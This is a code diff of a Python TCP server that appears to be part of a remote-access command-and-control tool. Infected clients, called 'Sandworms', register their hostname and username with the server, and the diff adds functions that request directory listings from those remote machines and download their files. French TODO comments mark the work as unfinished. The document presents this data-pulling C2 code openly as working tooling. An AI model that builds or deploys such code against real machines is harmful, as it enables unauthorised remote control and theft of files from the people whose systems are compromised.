@@ -1,13 +1,14 @@
 import threading
 import socket
 import logger
+import os
 
 log = logger.Logger(verbosity="debug")
 
 
 class TCPServer:
 
-    def __init__(self, IP:str, PORT:int, on_new_sandworm, threads:int = 5):
+    def __init__(self, IP:str, PORT:int, index:int, on_new_sandworm, threads:int = 5):
         """
         Initializing the TCPServer class
 
@@ -19,6 +20,7 @@ class TCPServer:
         self.IP = IP
         self.PORT = PORT
         self.threads = threads
+        self.index = index
         
         self.server = None # will be initialized in listen()
         self.running = False # Flag to control server shutdown
@@ -75,7 +77,7 @@ class TCPServer:
                 }
 
                 # Notifying ArakisCLI about new connection
-                self.on_new_sandworm(index, hostname, username, client_socket)
+                self.on_new_sandworm(index, hostname, username, client_socket, self.index)
 
                 log.info(f"Sandworm [{index}] registered -> Host: {hostname}, User: {username}")
                 
@@ -94,6 +96,8 @@ class TCPServer:
             self.stop()
 
 
+    # TODO : J'ai l'impression que cette fonctione ne sert plus à grand chose
+    # Peut-être regarder pour la changer en un "prober" à la place
     def handle_client(self, client_socket, index):
         """
         Handles a single client connection.
@@ -128,6 +132,65 @@ class TCPServer:
             self.counter-=1
             log.info(f"Closing connection with client {index}")
             client_socket.close()
+
+
+    def get_listing(self, client_socket):
+        """
+        Send back client's directory listing
+        TODO : add path option
+        """
+        client_socket.send("LIST".encode())
+
+        response_data = ""
+        while True:
+            chunk = client_socket.recv(4096).decode()
+            if "END_FILES" in chunk:
+                response_data += chunk.replace("END_FILES", "")
+                break
+            response_data += chunk
+
+        return response_data[6:]
+    
+
+    def download_remote_file(self, client_socket, file_info):
+        """
+        Download the specified file from the remote system
+
+        TODO : Terminer la fonction de download : sandworm, arakis, ici et client
+        """
+        try:
+            _, filename, filesize = file_info.split()
+            filename = os.path.basename(filename) # Prevent directory traversal (HOW??)
+            filesize = int(filesize)
+
+            log.info(f"Receiving file: {filename} ({filesize} bytes)")
+
+            with open(filename, "wb") as file:
+                received = 0
+                while received < filesize:
+                    chunk = client_socket.recv(4096)
+                    if b"FILE_END" in chunk: # Je me demande si un fichier qui contient FILE_END poserait pas un problème ?
+                        chunk = chunk.replace(b"FILE_END", b"")
+                        file.write(chunk)
+                        break
+                    file.write(chunk)
+                    received += len(chunk)
+
+            log.info(f"File '{filename}' received successfully.")
+
+        except Exception as e:
+            log.error(f"Error receiving file: {e}")
+
+
+
+    def close_socket(self, client_socket):
+        """
+        Close client's socket client_socket
+        TODO : Valider si la fonction handle_client qui roule dans le thread pose problème
+        """
+        log.warning("Closing client socket..")
+        client_socket.close()
+        log.warning("Client socket closed")
 
 
     def send_to_client(self, index, command):
